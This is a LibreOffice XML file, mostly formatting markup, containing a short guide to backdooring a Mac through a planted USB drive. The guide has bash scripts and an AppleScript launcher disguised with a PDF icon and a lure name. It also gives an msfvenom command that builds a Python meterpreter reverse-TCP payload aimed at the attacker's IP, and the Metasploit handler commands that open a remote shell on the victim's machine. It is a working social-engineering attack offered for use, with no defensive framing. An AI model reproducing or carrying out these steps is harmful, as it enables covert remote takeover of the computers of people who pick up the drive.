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0pt" officeooo:rsid="000da3c8" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="20pt" style:font-size-complex="20pt"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="00162398" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="12pt" officeooo:rsid="000da3c8" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-size="15pt" officeooo:rsid="00162398" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="15pt" style:font-size-complex="15pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="00162398" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000da3c8" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000da3c8"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="00162398" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000da3c8" officeooo:paragraph-rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000f1e7c" officeooo:paragraph-rsid="000f1e7c" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000f1e7c" officeooo:paragraph-rsid="000f1e7c" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" officeooo:rsid="000f1e7c" officeooo:paragraph-rsid="000f1e7c"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:paragraph-rsid="000f1e7c"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000f1e7c" officeooo:paragraph-rsid="000f1e7c"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties fo:color="#c9211e" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000da3c8" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="00170f9b"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" fo:font-size="12pt" officeooo:rsid="000f1e7c" style:font-size-asian="10.5pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:font-size="12pt"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ckdooring a Mac with Meterpreter (Social Engineering)</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Requires a Mac or an Applescript emulator</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2">Create a PDF File, saying something along the lines of ‘Please email [Email Address] if you find this USB’ Name it anything. Save it into a folder named ‘Private’ on your USB drive.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P2">Create a new text file. Paste the code below into it:</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P6">#!/bin/bash/</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P7"><text:span text:style-name="T1">cd [Path to ‘Private’ Folder]</text:span></text:p>
      <text:p text:style-name="P6">python pyterpreter.py</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P2">Save this file as TermsAndConditions.sh, and place it in the folder named ‘Private’</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Create a second new text file. Paste the code below into it:</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">#!/bin/bash</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">open [Path to actual PDF file]</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P2">Save this file as PrivacyPolicy.sh and place it in the ‘Private’ Folder</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Using the Applescript Editor on a Mac or an emulator for it, create a new file. Paste the code below into it:</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P5">do shell script “bash [Path to TermsAndConditions.sh] &amp; bash [Path to PrivacyPolicy.sh]”</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P2">Export this file as an application, and name it something like ‘Read if USB Lost’</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P8">Spoof the icon. Right click on the file and click ‘Get Info’. Get your PDF file icon, and drag it from it’s folder into the top left corner of the ‘Get Info’ window. This will change the file icon. It is optional to spoof the file extensi<text:span text:style-name="T2">on.</text:span></text:p>
      <text:p text:style-name="P8"/>
      <text:p text:style-name="P9">Generate the payload</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">msfvenom -p python/meterpreter/reverse_tcp LHOST=[Attacker’s IP Address] LPORT=[Port Number] &gt; pyterpreter.py</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P13"><text:span text:style-name="T4">This will generate a file named ‘pyterpreter.py’ in your home folder. Move this folder to the ‘Private’ folder on your USB</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T4"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Start Metasploit</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">msfconsole</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Type these commands:</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">use multi/handler</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:soft-page-break/><text:span text:style-name="T5">set lhost [Attacker’s IP Address]</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">set lport [Port Number]</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">set payload python/meterpreter/reverse_tcp</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">exploit -j -z</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Wait for a connection</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">Press enter to go back to the command line</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">sessions</text:span></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P12"><text:span text:style-name="T5">sessions -i [session number]</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"/></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3">You are now in a meterpreter shell</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>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5T14:05:00.272412583</meta:creation-date>
    <dc:date>2021-02-25T14:35:52.543353962</dc:date>
    <meta:editing-duration>PT1S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="32" meta:word-count="288" meta:character-count="1724" meta:non-whitespace-character-count="1468"/>
    <meta:generator>LibreOffice/7.0.3.1$Linux_X86_64 LibreOffice_project/00$Build-1</meta:generator>
  </office:meta>
</office:document-meta>
</file>